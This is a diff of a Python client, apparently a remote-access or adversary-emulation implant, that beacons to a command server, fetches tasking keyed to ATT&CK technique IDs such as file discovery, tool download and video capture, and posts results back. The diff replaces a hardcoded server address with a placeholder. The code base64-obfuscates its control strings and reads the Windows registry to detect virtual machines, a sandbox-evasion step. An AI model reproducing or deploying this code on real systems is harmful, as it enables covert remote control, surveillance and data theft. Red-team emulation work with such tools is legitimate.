@@ -123,7 +123,7 @@ def main(ip,cert):
     while True:
         while True:
             try:
-                requests.post('https://192.168.0.15/is_ok', data={"ip":ip}, verify=cert)
+                requests.post('https://###CHANGE_FOR_IP###/is_ok', data={"ip":ip}, verify=cert)
                 break
             except:
                 sleep(5)
@@ -131,7 +131,7 @@ def main(ip,cert):
         while True:
             res = ''
             try:
-                req_control_data = requests.get(f'https://192.168.0.15/get_tactic/{ip}', verify=cert)
+                req_control_data = requests.get(f'https://###CHANGE_FOR_IP###/get_tactic/{ip}', verify=cert)
                 if req_control_data.status_code==404:
                     sleep(5)
                 else:
@@ -147,7 +147,7 @@ def main(ip,cert):
             res = client.t_1083()
         elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDExMDU=').decode():
         
-            data = requests.get(f'https://192.168.0.15/get_files?file={req_control_data['add_data']}', verify=cert)
+            data = requests.get(f'https://###CHANGE_FOR_IP###/get_files?file={req_control_data['add_data']}', verify=cert)
             if data.status_code==200:
                 res = client.t_1105()
             else:
@@ -174,12 +174,10 @@ def main(ip,cert):
         elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDExMjU=').decode():
             res = client.t_1125()
 
-        requests.post('https://192.168.0.15/results.html', data={"ip":ip, f"{base64.b64decode('dGFjdGlj').decode()}":req_control_data[base64.b64decode('dGFjdGlj').decode()], "data":res}, verify=cert)
+        requests.post('https://###CHANGE_FOR_IP###/results.html', data={"ip":ip, f"{base64.b64decode('dGFjdGlj').decode()}":req_control_data[base64.b64decode('dGFjdGlj').decode()], "data":res}, verify=cert)
 
 
 if __name__=="__main__":
-    #Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD&DEV_0790&SUBSYS_079015AD&REV_02
-    #                                                              VEN_XXXX&DEV_YYYY&SUBSYS_ZZZZ&REV_WW
     from winreg import CreateKeyEx,EnumKey, HKEY_LOCAL_MACHINE,KEY_READ
     handle = CreateKeyEx(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Enum\\PCI\\', access=KEY_READ)
     is_vm = False
